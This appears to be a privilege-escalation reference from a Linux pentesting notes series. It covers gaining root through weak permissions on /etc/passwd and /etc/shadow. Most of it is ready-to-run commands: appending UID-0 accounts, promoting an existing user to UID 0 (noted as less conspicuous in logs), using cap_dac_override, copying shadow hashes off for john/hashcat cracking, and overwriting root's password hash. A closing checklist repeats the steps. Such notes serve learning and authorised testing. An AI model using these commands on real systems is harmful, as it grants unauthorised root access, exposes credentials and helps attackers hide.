# 12 — /etc/passwd & /etc/shadow Direct Abuse

> **Note:** Weak-file-permissions basics for `/etc/passwd` and `/etc/shadow` are covered briefly in `05-weak-file-permissions.md`. This file goes deeper — covering every entry point that leads to these two files (direct write, capability-based write, and hash injection detail) in one consolidated reference.

---

## Why These Two Files Matter

| File | Contains | Normal Permission |
|------|----------|-------------------|
| `/etc/passwd` | Username, UID, GID, home dir, shell | World-readable (`-rw-r--r--`) |
| `/etc/shadow` | Actual password hashes | Root/shadow-group only (`-rw-r-----`) |

**Core fact:** UID `0` = root, regardless of username. If you can write a line to `/etc/passwd` with UID 0, you've created a new root account.

---

## Entry Point 1 — Directly Writable /etc/passwd

### Check

```bash
ls -la /etc/passwd
find / -writable -name passwd 2>/dev/null
```

### Exploit — Add Root User with Password

```bash
openssl passwd -1 -salt xyz 'MyPass123'
# Output: $1$xyz$HASH...

echo 'rootx:$1$xyz$HASH...:0:0:root:/root:/bin/bash' >> /etc/passwd
su rootx
# Password: MyPass123
```
**Breakdown:**

| Field | Meaning |
|-------|---------|
| `rootx` | New username |
| `$1$xyz$HASH...` | MD5 password hash |
| `0:0` | UID:GID = 0 = root |
| `root` | GECOS comment field |
| `/root` | Home directory |
| `/bin/bash` | Login shell |

### Exploit — Add Root User with NO Password (faster, if allowed)

```bash
echo 'rootx::0:0:root:/root:/bin/bash' >> /etc/passwd
su rootx
```
**Breakdown:** Empty password field between the two colons (`::`) means no password is required. Some hardened PAM configs reject this — if `su` fails, fall back to the hash method above.

---

## Entry Point 2 — Readable + Writable via a Capability

If `python3`, `vim`, or similar has `cap_dac_override`, you bypass normal permission checks entirely (see `07-capabilities.md` for the full capability list). Quick recap for this specific target:

```bash
getcap -r / 2>/dev/null | grep -i dac
```

```bash
python3 -c "
open('/etc/passwd','a').write('rootx::0:0:root:/root:/bin/bash\n')
"
su rootx
```

---

## Entry Point 3 — Modifying an Existing User Instead of Adding One

Sometimes it's cleaner (and stealthier) to change an **existing** low-privilege user's UID to 0 rather than adding a new suspicious account:

```bash
cat /etc/passwd | grep bash
# Find a normal-looking user, e.g.: steve:x:1001:1001:Steve:/home/steve:/bin/bash

sed -i 's/steve:x:1001:1001/steve:x:0:0/' /etc/passwd
```
**Breakdown:**
- `sed -i` = edit the file in place
- `'s/old/new/'` = substitute pattern
- Changes `steve`'s UID and GID from `1001:1001` to `0:0`
- `su steve` now logs in with root-level UID while keeping the familiar username (less conspicuous in logs than a new `rootx` account)

```bash
su steve
id
# uid=0(steve) — note username stays "steve" but UID is 0 = effectively root
```

---

## Entry Point 4 — Readable /etc/shadow (Hash Extraction)

### Check

```bash
ls -la /etc/shadow
cat /etc/shadow 2>/dev/null
```

### Full Offline Cracking Workflow

```bash
# On target - dump both files
cat /etc/passwd
cat /etc/shadow

# Transfer both to attacker machine, then:
unshadow passwd.txt shadow.txt > combined.txt

john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
john --show combined.txt
```
**Breakdown:**
- `unshadow` = merges passwd + shadow into the format John the Ripper expects
- Needed because shadow alone lacks username-to-UID mapping context John uses for display
- `john --show` = reveal previously cracked passwords without re-running the attack

### Identifying Hash Type for Hashcat

```bash
# Hash prefix tells you the algorithm:
# $1$ = MD5        -> hashcat -m 500
# $5$ = SHA-256     -> hashcat -m 7400
# $6$ = SHA-512     -> hashcat -m 1800
# $y$ = yescrypt    -> hashcat -m 26200 (newer, slower to crack)

hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Entry Point 5 — Writable /etc/shadow (Rare but Direct)

If `/etc/shadow` itself is writable (not just readable), you can skip cracking entirely and just overwrite the hash field with a known one:

```bash
# Generate a hash you know the plaintext for
openssl passwd -6 -salt xyz 'MyPass123'
# Output: $6$xyz$LONGHASH...

# Replace root's hash field directly
sed -i 's|^root:[^:]*:|root:$6$xyz$LONGHASH...:|' /etc/shadow

su root
# Password: MyPass123
```
**Breakdown:**
- `sed -i 's|^root:[^:]*:|...|'` = matches from start of line (`^root:`), captures everything up to the next colon (`[^:]*`), replaces it with the new hash
- `|` used as the sed delimiter instead of `/` because the hash itself may contain `$` and other characters that could conflict
- This directly overwrites root's own password — no new account needed, no cracking needed

---

## Combining with Backup/Temp File Discovery

Sometimes `/etc/passwd` or `/etc/shadow` themselves are locked down correctly, but **backup copies** are not:

```bash
find / -name "passwd*" 2>/dev/null
find / -name "shadow*" 2>/dev/null
find / -name "*.bak" -o -name "*~" 2>/dev/null | grep -i "passwd\|shadow"

ls -la /etc/passwd- /etc/passwd.bak /etc/shadow- /etc/shadow.bak 2>/dev/null
```
**Why important:** Editors and backup tools often leave `passwd-`, `passwd.bak`, `shadow-` copies with looser permissions than the originals — these can leak hashes even when the live files are properly locked down.

---

## Summary Table

| Scenario | Action |
|----------|--------|
| `/etc/passwd` writable | Append new UID 0 user, or edit existing user's UID to 0 |
| `/etc/shadow` readable only | Crack offline with John/Hashcat |
| `/etc/shadow` writable | Overwrite a known user's hash directly with your own |
| Capability (`cap_dac_override`) present | Use it to write/read either file despite permissions |
| Backup files found (`passwd-`, `shadow.bak`) | Check their permissions separately — often looser |

---

## Quick Checklist

```
[ ] ls -la /etc/passwd /etc/shadow                       → check permissions
[ ] find / -writable -name "passwd*" 2>/dev/null         → writable passwd variants
[ ] find / -name "*.bak" 2>/dev/null | grep -i "passwd\|shadow"  → backup leaks
[ ] openssl passwd -1 -salt xyz 'pass'                   → generate hash
[ ] echo 'user:hash:0:0:root:/root:/bin/bash' >> /etc/passwd  → add root user
[ ] sed -i 's/user:x:UID:GID/user:x:0:0/' /etc/passwd    → promote existing user
[ ] cat /etc/shadow → unshadow → john/hashcat             → crack hashes offline
[ ] sed -i 's|^root:[^:]*:|root:$NEWHASH:|' /etc/shadow  → overwrite hash directly (if writable)
[ ] su <user> / id                                        → confirm root
```
